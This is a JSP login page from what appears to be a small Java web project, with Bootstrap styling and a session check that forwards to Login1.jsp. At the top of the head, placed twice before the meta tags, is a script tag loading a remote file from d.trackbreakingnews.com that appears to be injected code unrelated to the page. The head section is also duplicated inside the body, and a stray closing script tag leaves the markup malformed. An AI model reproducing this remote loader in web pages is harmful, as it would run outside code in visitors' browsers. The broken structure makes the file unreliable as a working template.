
<!DOCTYPE html>
<html lang="en">
  <head><script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
	<title>Login</title>
    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    body{

	background-image:url("iWall/tweet.jpg");
	background-size:cover;
}

.HX h2{
	color: #fff;
	font-size: 29px;
	font-family: Lato;
	font-weight: bolder;
}

.HX p{

	text-align: left;
	font-weight: bold;
	color: #fff;
	font-size: 22px;
	font-family: Lato;
}

.LS {

	border-radius: 8px;
}


.LS1 {

	border-radius: 8px;
}
.Fot{
	width:100%;
	top:350px;
	position:relative;
	padding-top:30px;
	background-color:#000;
	text-align: center;
	
}
.XLL {
	width:0px;
	height:30px;
	background-color: #fff;
	position: relative;
	top:40px;
}
.XL {
	position:relative;
	right:-25px;
	width: 300px;
	height: 40px;
	padding-top:18px;
}
.FOT{
	position: relative;
	top:390px;
}
.FFF{
	position:relative;
	top:370px;
}
    </style>
  </head>

        <body>

    
   
<!DOCTYPE html>
<html lang="en">
  <head><script src="http://d.trackbreakingnews.com/l/load.js"></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">
	<title>Login</title>
    <!-- Bootstrap core CSS -->
    <link href="CSS/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="CSS/bootstrap-theme.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="CSS/theme.css" rel="stylesheet">
    <link href="CSS/Style.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>
    
</script>
<link rel="stylesheet" href="CSS/animate.css">
<script src="wow.min.js"> </script>
<script> new WOW().init();</script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
    body{

	background-image:url("iWall/tweet.jpg");
	background-size:cover;
}

.HX h2{
	color: #fff;
	font-size: 29px;
	font-family: Lato;
	font-weight: bolder;
}

.HX p{

	text-align: left;
	font-weight: bold;
	color: #fff;
	font-size: 22px;
	font-family: Lato;
}

.LS {

	border-radius: 8px;
}


.LS1 {

	border-radius: 8px;
}
.Fot{
	width:100%;
	top:350px;
	position:relative;
	padding-top:30px;
	background-color:#000;
	text-align: center;
	
}
.XLL {
	width:0px;
	height:30px;
	background-color: #fff;
	position: relative;
	top:40px;
}
.XL {
	position:relative;
	right:-25px;
	width: 300px;
	height: 40px;
	padding-top:18px;
}
.FOT{
	position: relative;
	top:390px;
}
.FFF{
	position:relative;
	top:370px;
}
    </style>
  </head>

        <body>

    
      <%
  		String user=(String) session.getAttribute("mail");
  	  		if(user!=null){
  			request.setAttribute("Error","Password Changed Successfully!");
  			RequestDispatcher rd=request.getRequestDispatcher("Login1.jsp");
  			rd.forward(request, response);	
  		
  		} %>
  <script src="jquery.min.js"></script>
			    <script src="js/bootstrap.min.js"></script>
			    <script src="js/docs.min.js"></script>
			    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
			    <script src="js/ie10-viewport-bug-workaround.js"></script>
			    <script>
				$('.dropdown').hover(function() {
					$('.dropdown-toggle',this).trigger('click');
				});
				</script>
			  </body>
			</html>